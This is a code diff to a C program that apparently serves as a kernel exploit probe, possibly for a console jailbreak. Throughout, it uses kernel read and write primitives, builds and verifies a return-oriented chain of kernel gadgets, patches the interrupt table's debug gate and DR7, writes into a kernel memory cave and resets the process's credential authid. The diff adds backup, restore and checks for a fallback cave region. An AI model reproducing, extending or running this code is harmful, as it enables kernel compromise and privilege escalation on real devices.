@@ -42,6 +42,7 @@
 
 static uint8_t saved_head[KH_SCRATCH_MIN];
 static uint8_t saved_big[BIG_SAVE_BYTES];
+static uint8_t saved_fallbacks[KH_1270_FALLBACK_SIZE];
 static char output_path[128];
 static int usb_log_enabled;
 static uint8_t ap_stub[STUB_QWORDS * 8];
@@ -117,6 +118,7 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
                    uint64_t authid, int restore_cave)
 {
   int disarm = 0, gate = 0, head = 0, big = 0, marker = 0;
+  int fallbacks = 0;
   if (armed) {
     intptr_t thread = kernel_get_proc_thread(getpid(), -1);
     uint64_t row_thread = 0;
@@ -134,13 +136,27 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
     head = kwrite(cave, saved_head, sizeof(saved_head));
     big = kwrite(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big));
     marker = kwrite(cave + KH_OFF_USER, saved_head + KH_OFF_USER, 8);
+    fallbacks = kwrite(cave + KH_1270_FALLBACK_OFF,
+                       saved_fallbacks, sizeof saved_fallbacks);
+    if (fallbacks == 0) {
+      uint8_t check[KH_1270_FALLBACK_STRIDE];
+      for (unsigned off = 0; off < sizeof saved_fallbacks;
+           off += sizeof check) {
+        if (kread(cave + KH_1270_FALLBACK_OFF + off,
+                  check, sizeof check) != 0 ||
+            memcmp(check, saved_fallbacks + off, sizeof check) != 0) {
+          fallbacks = -1;
+          break;
+        }
+      }
+    }
   }
   int carrier_map = restore_carrier_map();
   int auth = kernel_set_ucred_authid(getpid(), authid);
-  klog("AFP1270,1,cleanup,disarm=%d,gate=%d,head=%d,big=%d,marker=%d,carrier_map=%d,auth=%d\n",
-       disarm, gate, head, big, marker, carrier_map, auth);
+  klog("AFP1270,1,cleanup,disarm=%d,gate=%d,head=%d,big=%d,marker=%d,fallbacks=%d,carrier_map=%d,auth=%d\n",
+       disarm, gate, head, big, marker, fallbacks, carrier_map, auth);
   int result = disarm == 0 && gate == 0 && head == 0 && big == 0 &&
-         marker == 0 && carrier_map == 0 && auth == 0
+         marker == 0 && fallbacks == 0 && carrier_map == 0 && auth == 0
          ? 0 : -1;
   probe_cleanup_seen = 1;
   probe_cleanup_status = result;
@@ -235,12 +251,22 @@ static int probe_main(void)
   if (!thread || read_qword(row, &row_thread) != 0 ||
       row_thread != (uint64_t)thread ||
       kread(cave, saved_head, sizeof(saved_head)) != 0 ||
-      kread(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big)) != 0) {
+      kread(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big)) != 0 ||
+      kread(cave + KH_1270_FALLBACK_OFF, saved_fallbacks,
+            sizeof saved_fallbacks) != 0) {
     kernel_set_ucred_authid(getpid(), authid);
     klog("RSH1270,1,stop,stage=thread-or-backup,thread=0x%016" PRIx64
          ",row_thread=0x%016" PRIx64 "\n",
          (uint64_t)thread, row_thread);
     return 5;
+  }
+  for (unsigned i = 0; i < sizeof saved_fallbacks; i++) {
+    if (saved_fallbacks[i] != 0) {
+      kernel_set_ucred_authid(getpid(), authid);
+      klog("RSH1270,1,stop,stage=fallback-cave-not-empty,off=0x%x\n",
+           KH_1270_FALLBACK_OFF + i);
+      return 5;
+    }
   }
 
   uint8_t handler_buf[(STUB_QWORDS + PARAM_QWORDS) * 5 * 8] = {0};
@@ -265,8 +291,8 @@ static int probe_main(void)
     }
   }
 
-  // The one-shot marker precedes this chain in the 0x600-byte data cave.
-  if (sizeof(uint64_t) * 5 + store_chain.len + 0x100 >
+  // Gate/DR7 teardown and the marker precede the AP stores; reserve the tail.
+  if (sizeof(uint64_t) * 13 + store_chain.len + 0xa0 >
       BIG_SAVE_BYTES) {
     kernel_set_ucred_authid(getpid(), authid);
     klog("AFP1270,1,stop,stage=chain-capacity,bytes=%zu,capacity=%u\n",
@@ -315,15 +341,25 @@ static int probe_main(void)
     return 10;
   }
   save_line("hook,after-install\n", 0);
+  save_line("hook,percpu-ist6-verified,count=16\n", 0);
 
-  uint64_t chain_prefix[5] = {0};
+  uint64_t chain_prefix[13] = {0};
+  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16 * KH_VEC_DB;
   int chain_ok = kread(cave + KH_OFF_BIG_CHAIN, chain_prefix,
                        sizeof(chain_prefix)) == 0 &&
                  chain_prefix[0] == kgadget(KERNEL_GADGET_POP_RCX) &&
-                 chain_prefix[1] == cave + KH_OFF_USER &&
+                 chain_prefix[1] == db_gate &&
                  chain_prefix[2] == kgadget(KERNEL_GADGET_POP_RAX) &&
-                 chain_prefix[3] == SECOND_MARKER &&
-                 chain_prefix[4] == kgadget(KERNEL_GADGET_ST_RCX_RAX);
+                 chain_prefix[3] == hook.saved_gate_lo &&
+                 chain_prefix[4] == kgadget(KERNEL_GADGET_ST_RCX_RAX) &&
+                 chain_prefix[5] == kgadget(KERNEL_GADGET_POP_RAX) &&
+                 chain_prefix[6] == 0 &&
+                 chain_prefix[7] == kgadget(KERNEL_GADGET_SET_DR7) &&
+                 chain_prefix[8] == kgadget(KERNEL_GADGET_POP_RCX) &&
+                 chain_prefix[9] == cave + KH_OFF_USER &&
+                 chain_prefix[10] == kgadget(KERNEL_GADGET_POP_RAX) &&
+                 chain_prefix[11] == SECOND_MARKER &&
+                 chain_prefix[12] == kgadget(KERNEL_GADGET_ST_RCX_RAX);
   if (!chain_ok) {
     save_line("hook,marker-chain-mismatch\n", 0);
     cleanup(&hook, 0, cave, authid, 1);
